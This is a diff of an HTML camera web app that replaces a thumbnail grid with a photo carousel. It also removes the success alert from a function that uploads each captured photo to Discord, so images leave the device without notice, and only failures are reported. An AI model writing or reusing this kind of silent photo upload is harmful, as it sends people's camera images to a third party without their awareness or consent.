@@ -56,66 +56,61 @@
             background: #3e8e41;
         }
 
+        #album-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            width: 300px;
+            height: 300px;
+            overflow: hidden;
+            margin-top: 20px;
+            border: 2px solid #4CAF50;
+            border-radius: 10px;
+        }
+
         #album {
             display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            margin-top: 20px;
-            max-width: 90%;
-            justify-content: center;
-        }
-
-        .thumbnail {
-            width: 100px;
-            height: 100px;
-            background: #ffffff;
-            border: 2px solid #4CAF50;
-            border-radius: 5px;
-            overflow: hidden;
-            cursor: pointer;
-            transition: transform 0.3s;
-        }
-
-        .thumbnail img {
+            position: absolute;
             width: 100%;
+            height: 100%;
+            transition: transform 0.5s ease;
+        }
+
+        .photo {
+            min-width: 100%;
             height: 100%;
             object-fit: cover;
         }
 
-        .thumbnail:hover {
-            transform: scale(1.1);
-        }
-
-        #preview {
-            position: fixed;
+        .navigation {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            position: absolute;
             top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            display: none;
-            z-index: 10;
-            max-width: 90%;
-            max-height: 90%;
+            transform: translateY(-50%);
         }
 
-        #preview img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
+        .nav-button {
+            background: rgba(0, 0, 0, 0.5);
+            color: white;
+            border: none;
+            padding: 10px;
+            cursor: pointer;
+            font-size: 20px;
+            border-radius: 50%;
         }
 
-        #preview-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+        .nav-button:hover {
             background: rgba(0, 0, 0, 0.7);
-            z-index: 5;
-            display: none;
         }
+
     </style>
     <script>
         let currentFacingMode = 'user';
+        let photoIndex = 0;
+        const photos = [];
 
         function startCamera(facingMode) {
             const video = document.getElementById('video');
@@ -136,30 +131,29 @@
         }
 
         function addToAlbum(blobUrl) {
+            photos.push(blobUrl);
+            updateAlbum();
+        }
+
+        function updateAlbum() {
             const album = document.getElementById('album');
-            const thumbnail = document.createElement('div');
-            thumbnail.className = 'thumbnail';
-            thumbnail.innerHTML = `<img src="${blobUrl}" alt="Foto">`;
-            thumbnail.onclick = () => showPreview(blobUrl);
-            album.appendChild(thumbnail);
+            album.style.transform = `translateX(-${photoIndex * 100}%)`;
+
+            album.innerHTML = photos.map(url => `<img src="${url}" class="photo">`).join('');
         }
 
-        function showPreview(blobUrl) {
-            const previewOverlay = document.getElementById('preview-overlay');
-            const preview = document.getElementById('preview');
-            const img = preview.querySelector('img');
-
-            img.src = blobUrl;
-            preview.style.display = 'block';
-            previewOverlay.style.display = 'block';
+        function nextPhoto() {
+            if (photoIndex < photos.length - 1) {
+                photoIndex++;
+                updateAlbum();
+            }
         }
 
-        function hidePreview() {
-            const previewOverlay = document.getElementById('preview-overlay');
-            const preview = document.getElementById('preview');
-
-            preview.style.display = 'none';
-            previewOverlay.style.display = 'none';
+        function prevPhoto() {
+            if (photoIndex > 0) {
+                photoIndex--;
+                updateAlbum();
+            }
         }
 
         async function sendToDiscord(blob) {
@@ -172,7 +166,6 @@
                     method: 'POST',
                     body: formData
                 });
-                alert('Foto berhasil dikirim ke Discord!');
             } catch (error) {
                 alert('Gagal mengirim ke Discord: ' + error.message);
             }
@@ -198,8 +191,6 @@
                     sendToDiscord(blob);
                 });
             });
-
-            document.getElementById('preview-overlay').onclick = hidePreview;
         });
     </script>
 </head>
@@ -214,10 +205,12 @@
             <i class="fas fa-sync-alt"></i>
         </button>
     </div>
-    <div id="album"></div>
-    <div id="preview-overlay"></div>
-    <div id="preview">
-        <img src="" alt="Preview Foto">
+    <div id="album-container">
+        <div id="album"></div>
+        <div class="navigation">
+            <button class="nav-button" onclick="prevPhoto()">&#10094;</button>
+            <button class="nav-button" onclick="nextPhoto()">&#10095;</button>
+        </div>
     </div>
 </body>
 </html>
